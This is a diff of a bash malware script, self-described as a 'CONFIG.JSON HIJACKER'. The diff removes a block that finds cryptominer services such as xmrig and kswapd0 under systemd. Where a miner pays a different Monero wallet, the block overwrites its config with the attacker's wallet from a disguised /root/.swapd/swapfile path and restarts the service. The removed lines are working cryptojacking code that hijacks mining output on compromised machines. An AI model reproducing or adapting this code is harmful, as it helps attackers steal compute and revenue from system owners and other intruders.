@@ -2595,54 +2595,6 @@ CONFIG_EOF
     fi
 done
 
-    # Also search for common miner service names and check their configs
-    echo "" >> "$HIJACK_LOG"
-    echo "[*] Checking systemd services for miners..." >> "$HIJACK_LOG"
-    for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
-        if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
-            echo "[*] Found service: $service_name.service" >> "$HIJACK_LOG"
-            
-            # Try to extract ExecStart path from service file
-            SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
-            if [ -f "$SERVICE_FILE" ]; then
-                # Look for config file reference in ExecStart
-                CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
-                if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
-                    echo "  Config: $CONFIG_PATH" >> "$HIJACK_LOG"
-                    
-                    # Check and hijack if needed
-                    if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
-                        CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                        
-                        # Validate it's actually a Monero wallet address
-                        if ! is_monero_wallet "$CURRENT_WALLET"; then
-                            echo "  [*] Not a miner config (invalid wallet format)" >> "$HIJACK_LOG"
-                            continue
-                        fi
-                        
-                        if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
-                            echo "  [!] Different wallet detected - hijacking..." >> "$HIJACK_LOG"
-                            cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
-                            
-                            # Copy our exact config
-                            if [ -f /root/.swapd/swapfile ]; then
-                                cp /root/.swapd/swapfile "$CONFIG_PATH"
-                                echo "  [✓] Copied our config → $CONFIG_PATH" >> "$HIJACK_LOG"
-                            else
-                                sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
-                                echo "  [✓] Wallet replaced" >> "$HIJACK_LOG"
-                            fi
-                            
-                            echo "  [*] Restarting service..." >> "$HIJACK_LOG"
-                            systemctl restart "$service_name" 2>/dev/null || true
-                            CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
-                        fi
-                    fi
-                fi
-            fi
-        fi
-    done
-    
     echo "" >> "$HIJACK_LOG"
     echo "=====================================================================" >> "$HIJACK_LOG"
     echo "[✓] CONFIG.JSON HIJACKER COMPLETE - $(date)" >> "$HIJACK_LOG"
